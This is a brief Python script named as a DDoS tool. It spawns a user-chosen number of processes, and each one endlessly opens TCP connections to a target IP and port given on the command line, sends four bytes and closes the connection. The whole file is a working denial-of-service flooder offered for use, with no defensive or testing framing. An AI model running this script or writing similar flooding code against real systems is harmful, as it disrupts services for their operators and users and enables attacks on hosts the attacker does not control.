import argparse
import socket
from multiprocessing import Process
from time import sleep


class Ddoser:
    def __init__(self, address, port):
        self.address = address
        self.port = port

    def destroy(self):
        counter = 0
        while 1:
            counter += 1
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.connect((self.address, self.port))
            s.send(int(0).to_bytes(4, byteorder='big'))
            s.close()


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-ip", type=str)
    parser.add_argument("-port", type=int)
    parser.add_argument("-threads", type=int)
    parser = parser.parse_args()
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    thread_list = []
    ddoser = Ddoser(parser.ip, parser.port)
    for x in range(parser.threads):
        thread_list.append(Process(target=ddoser.destroy))
        thread_list[x].start()
    sleep(1)
